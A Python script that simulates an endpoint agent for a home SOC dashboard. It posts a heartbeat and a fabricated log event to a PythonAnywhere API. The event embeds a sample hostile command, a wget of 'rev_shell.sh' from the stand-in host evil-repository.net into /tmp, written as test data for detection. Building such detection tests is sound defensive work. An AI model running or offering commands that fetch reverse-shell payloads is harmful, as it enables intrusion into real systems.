import requests
import json
import time

# Toggle between local and cloud testing
# SERVER_URL = "http://localhost:5000/api" 
SERVER_URL = "https://riyasingh.pythonanywhere.com/api"

print("Starting Local File Download Simulation Monitor...")
print("Monitoring user downloads directory for new scripts...\n")
time.sleep(2)

# Simulate the agent intercepting a new file download via wget/curl
download_log = {
    "hostname": "Ubuntu-Fileserver-02",
    "logs": [
        {
            "event_type": "log_event",
            "message": "User guest downloaded suspicious script: wget http://evil-repository.net/rev_shell.sh",
            "raw_data": {
                "user": "guest",
                "binary": "/usr/bin/wget",
                "args": ["http://evil-repository.net/rev_shell.sh", "-O", "/tmp/rev_shell.sh"],
                "destination": "/tmp/rev_shell.sh",
                "source_url": "http://evil-repository.net/rev_shell.sh"
            }
        }
    ]
}

print(f"Detected a new suspicious download: {download_log['logs'][0]['raw_data']['source_url']}")
print("Forwarding file metadata to HomeSOC for analysis...\n")

try:
    # 1. Register the host first (simulate heartbeat)
    requests.post(f"{SERVER_URL}/heartbeat", json={
        "hostname": "Ubuntu-Fileserver-02", 
        "ip_address": "10.0.0.12", 
        "os": "Ubuntu 22.04 LTS"
    })
    
    # 2. Forward the suspicious log
    resp = requests.post(f"{SERVER_URL}/logs", json=download_log)
    if resp.status_code == 200:
        print("[+] Suspicious File Download payload sent successfully!")
        print("[!] Severity: MEDIUM - Check your dashboard for popups.")
    else:
        print(f"[-] Failed to send payload. Status code: {resp.status_code}")
except Exception as e:
    print(f"[-] Connection Error: {e}")
    print("Is the HomeSOC server running?")
